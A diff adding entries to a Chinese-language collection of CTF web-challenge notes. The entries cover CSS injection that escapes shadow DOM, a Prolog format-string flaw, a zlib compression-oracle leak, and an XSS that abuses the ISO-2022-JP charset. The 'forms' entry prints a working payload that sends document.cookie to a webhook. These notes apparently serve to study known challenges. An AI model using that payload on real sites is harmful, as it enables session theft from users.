@@ -175,6 +175,22 @@
 - [IN-THE-SHADOWS](https://blog.huli.tw/2024/06/28/google-ctf-2024-writeup),[官方wp](https://github.com/google/google-ctf/tree/main/2024/quals/web-in-the-shadows)
     - css injection。目标是绕过过滤的情况下一次注入泄漏出[shadow dom](https://developer.mozilla.org/en-US/docs/Web/API/Web_components/Using_shadow_DOM)之外的元素。“逃逸”shadow dom可以用`:host-context`或者`:host`。绕过过滤则是由于chromium的一个bug（现在修了），主要是在re-serialization某个style sheet（或者说取出某个css rule的cssText？）时，单引号被去掉了，导致css的含义改变，可以偷渡`@import`进去
     - 单注入点css injection泄漏内容。第一篇wp用了trigram的做法，个人感觉官方wp的做法更好,见 https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point
+- [forms](https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/blob/main/Web/forms)
+	- Content-Type header没有设置charset导致的xss。见这篇文章： https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/ 。浏览器一般按照这样的顺序决定当前文档使用的字符集：
+	1. HTML文档开头的Byte-Order Mark（这玩意的xss见上面的secure-notes）
+	2. Content-Type header里的charset属性
+	3. HTML文档里的`<meta>`标签
+	4. 都没有的话就由浏览器自动检测。有个字符集ISO-2022-JP非常特殊，首先它有四种escape sequences切换当前使用的字符集（文章里可以看到是什么，只要浏览器看见它们就会切换到对应的字符集）。其中一种`JIS X 0201 1976`和ascii基本相同，而重要的不同点在于`\`，在`JIS X 0201 1976`下会被看成日元的符号，反之亦然
+	- 这道题作者的payload是`{'title': 'Totally not a sus title\x1b(J', 'questions': '[["Are you an impostor?\\"}];fetch(`webhook?${document.cookie}`).then(console.log);const foo=[//", true]]'}`，然后让admin打开`/form/fill/id`，内容为：
+```html
+        <title>Totally not a sus title(J</title>
+        ...省略不重要的内容...下面这块是源码里base.html的内容
+        <script>
+        const messages = [
+                    {category: 'error', message: "The following question is required: Are you an impostor?\"}];fetch(`webhook?${document.cookie}`).then(console.log);const foo=[//" },
+        ];
+```
+最开始的title切换了当前的charset，因此其他的都正常渲染，除了那个`\`。这个符号本来是拿来转义后面的`"`的，没了后我们剩下的内容就逃逸出去了，成功执行xss payload。不过我这里用chrome打开没见到payload执行，可能因为bot用的是firefox
 
 ## SSTI
 
@@ -3852,3 +3868,6 @@ new URL("//a.com","http://b.com")
 479. [Pwning en Logique](https://siunam321.github.io/ctf/ImaginaryCTF-2024/Web/Pwning-en-Logique/)
 - [SWI-Prolog](https://www.swi-prolog.org/)环境搭建的网站
 - prolog语言格式化字符串漏洞。如果攻击者可以控制[format](https://www.swi-prolog.org/pldoc/doc_for?object=format/2)函数的格式符和参数，就能执行任意函数
+480. [heapnotes](https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/blob/main/Web/heapnotes)
+- 说是xs leak，但好像和xss一点关系都没有。主要是利用了flask的redirect函数的目标url有长度限制，若超出了这个限制就不会返回200，而是404（和[这个情况](https://stackoverflow.com/questions/67620929/url-limit-in-flask)有点像）
+- 这题还有点zlib compress oracle的成分。题目会把包含flag的username和攻击者可控制的内容一起压缩，然后把结果放到redirect的url里。利用zlib遇到相同字符压缩后长度会变短的特点，一个字符一个字符地猜flag。如果猜对了，压缩的内容变短，就能成功redirect；反之则返回404
